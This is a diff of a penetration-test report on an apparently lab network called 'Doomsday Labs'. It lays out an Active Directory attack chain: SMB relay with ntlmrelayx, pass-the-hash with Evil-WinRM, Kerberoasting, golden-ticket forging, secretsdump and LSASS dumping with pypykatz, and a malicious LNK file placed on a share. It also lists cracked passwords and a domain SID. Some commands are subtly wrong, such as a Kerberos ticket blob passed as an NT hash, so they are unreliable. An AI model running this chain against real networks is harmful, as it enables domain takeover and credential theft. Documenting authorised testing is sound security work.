@@ -1,55 +1,78 @@
 # Comprehensive Penetration Testing Report for Doomsday Labs
 
 ## Executive Summary
-This document summarizes the penetration test conducted against Doomsday Labs' network spanning the IP range 10.100.1.2 to 10.100.1.7. The objective was to identify and exploit vulnerabilities within the network to improve security measures.
+This document details the penetration testing activities undertaken against Doomsday Labs' network, specifically scoped within the IP range 10.100.1.2 to 10.100.1.7. The objective was to identify vulnerabilities and to assess the potential impacts on the network's security posture. The testing involved several methodologies including OSINT, SMB Relay attacks, Credential Dumping, and Active Directory Exploitation.
 
 ## Test Environment
-- **Scope**: IPs 10.100.1.2 to 10.100.1.7
-- **Tools Used**: Nmap, Crackmapexec, Responder, Hashcat, Impacket, Bloodhound, Neo4j
+- **Scope**: Targeted IP addresses from 10.100.1.2 to 10.100.1.7.
+- **Tools Used**: Nmap, Crackmapexec, Responder, Hashcat, Impacket, Bloodhound, Neo4j, pypykatz, Evil-WinRM
 
 ## Key Exploits and Findings
 
-### SMB Relay and Hash Capture
-- **Method**: Employed Crackmapexec for SMB Relay attacks to capture NTLM hashes.
-- **Outcome**: Credentials obtained were leveraged to infiltrate network systems, indicating significant security weaknesses.
+### SMB Relay and Credential Harvesting
+- **Target File**: `targets.txt` (contains the scope of testing IP addresses)
+- **Method**: Utilized Crackmapexec and Impacket's ntlmrelayx for SMB Relay attacks to capture and relay NTLM hashes.
+    ```
+    crackmapexec smb 10.100.1.2-7 --gen-relay-list targets.txt -socks
+    impacket-ntlmrelayx -smb2support -tf targets.txt
+    ```
+- **Outcome**: Successfully captured NTLM hashes and relayed them to gain unauthorized access to network systems, this allowed us to gain our initial credentials for further testing.
 
 ### Credential Dumping
-- **Technique**: Utilized Hashcat to decrypt captured NTLM hashes, gaining plaintext passwords.
-- **Impact**: The extracted credentials facilitated unauthorized access, highlighting susceptibility to credential stuffing attacks.
+- **Tools**: Evil-WinRM, pypykatz
+- **Example Command**:
+    ```
+    evil-winrm -i 10.100.1.4 -u info -H 322e0b51ca281c55:F1F9E4FF7872D084AC0E2CB11DE7D2C0
+    ```
+- **Results**: Accessed hosts using dumped NTLM hashes and manually dumped credentials using pypykatz on compromised systems.
+- Plaintext Password: Football24
 
-### Active Directory Exploitation
-- **Tools**: Bloodhound and Neo4j were used to analyze trust relationships and AD configurations.
-- **Results**: Successfully escalated privileges to Domain Admin, exposing severe vulnerabilities.
+### Active Directory and Kerberos Attacks
+- **Enumeration**:
+    ```
+    impacket-GetADUsers doomsdaylabs.net/filemaker:Football24 -dc-ip 10.100.1.2 -all
+    ```
+- **Kerberoasting**:
+    ```
+    impacket-GetUserSPNs doomsdaylabs.net/filemaker -dc-ip 10.100.1.2 -request
+    ```
+    Attempted to crack Kerberos tickets using Hashcat.
+- **Pass the Ticket & Golden Ticket Creation**:
+    ```
+    impacket-ticketer -nthash     doIF0jCCBc6gAwIBBaEDAgEWooIEyz...[snipped]...NXU/rX266m632YeSk3csEUpoKMTPZ -domain-sid S-1-5-21-2774200336-3400690103-1452933870-1111 -domain doomsdaylabs.net da.admin
+    KRB5CCNAME=./Administrator.ccache impacket-secretsdump -k -no-pass -dc-ip 10.100.1.2 -target-ip 10.100.1.2 dc.doomsdaylabs.net
+    ```
+- Plaintext password: Sunshine24
 
-### Bloodhound Analysis
-- **Objective**: Map out Active Directory trust relationships and identify potential privilege escalation paths.
+### Bloodhound Analysis for Lateral Movement
+- **Objective**: Utilize Bloodhound to identify and exploit lateral movement pathways within the network.
 - **Process**:
-    - Used Bloodhound with the Neo4j database to visualize AD environments and pinpoint misconfigurations.
-    - Specific commands included:
-        ```bash
-        bloodhound-python -c All -d domain.com -u username -p password -gc path_to_neo4j
-        ```
-    - This allowed us to identify high-risk targets within the network and plan our attack vectors more effectively.
+    - Repeated use of Bloodhound to map out different phases of lateral movement as administrative privileges were escalated throughout the network.
 
-## Methodology
-The approach ranged from initial reconnaissance using passive data gathering to active exploitation of identified vulnerabilities, using sophisticated tools and techniques.
+## Lateral Movement Pathways
+Detailed steps of movement from initial access on a file share to domain privilege escalation:
+- **Initial Access**:
+    - Placed a malicious LNK file on an SMB Share to capture FileMaker's NetNTLM hash.
+    - Credentials obtained were used to access a workstation (first lateral movement).
+- **Subsequent Movements**:
+    - Leveraged administrative privileges on different machines, used credentials for Kerberoasting, and eventually gained access to the domain controller.
 
-## Detailed Findings and Recommendations
-- **SMB Relay Attack**: 
-  - *Recommendation*: Implement SMB signing across the board to mitigate such vulnerabilities.
-- **Credential Security**:
-  - *Recommendation*: Revise password policies and perform routine security audits.
-- **Active Directory and Bloodhound Insights**:
-  - *Recommendation*: Regularly update AD configurations, use Bloodhound to continuously monitor for potential security gaps, and address findings promptly.
+## Recommendations
+- **SMB Relay Attack Mitigation**: Implement SMB signing and enforce strict authentication checks to mitigate relay attacks.
+- **Credential Security**: Enhance monitoring of credential usage and implement multi-factor authentication where possible.
+- **Active Directory Security**: Regularly update and patch Active Directory environments. Use advanced monitoring tools like Bloodhound to detect unusual patterns of movement or privilege escalation.
 
 ## Conclusion
-Immediate and focused actions are recommended to rectify the identified security issues, significantly enhancing the network's defenses.
+The penetration test revealed several critical vulnerabilities in Doomsday Labs' network that could potentially be exploited by malicious actors to gain unauthorized access and control over network resources. It is recommended that the findings and recommendations detailed in this report be addressed promptly to improve the security posture of the organization.
 
-## Appendix: Command Logs and Outputs
-- **SMB Relay Setup**: `crackmapexec smb 10.100.1.2-7 --gen-relay-list targets.txt`
-- **Hash Cracking**: `hashcat -m 5600 example.hashes /usr/share/wordlists/rockyou.txt --force`
-- **Bloodhound Scanning**: 
-    ```bash
-    sudo bloodhound-python -c All -d domain.com -u username -p password --zip output.zip
-    neo4j console
-    ```
+## Appendix
+- **Tools and Commands**:
+    - `crackmapexec smb 10.100.1.2-7 --gen-relay-list targets.txt`
+    - `impacket-ntlmrelayx -smb2support -tf targets.txt`
+    - `evil-winrm -i 10.100.1.4 -u filemaker -H NThash`
+    - `pypykatz lsa minidump lsass.dmp`
+
+## References
+- [Hashcat Rule-based Attack Guide](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
+- [CrackMapExec Kali Tool](https://www.kali.org/tools/crackmapexec/)
+- [Using Hashcat for Rule-based Attacks](https://www.armourinfosec.com/performing-rule-based-attack-using-hashcat/)
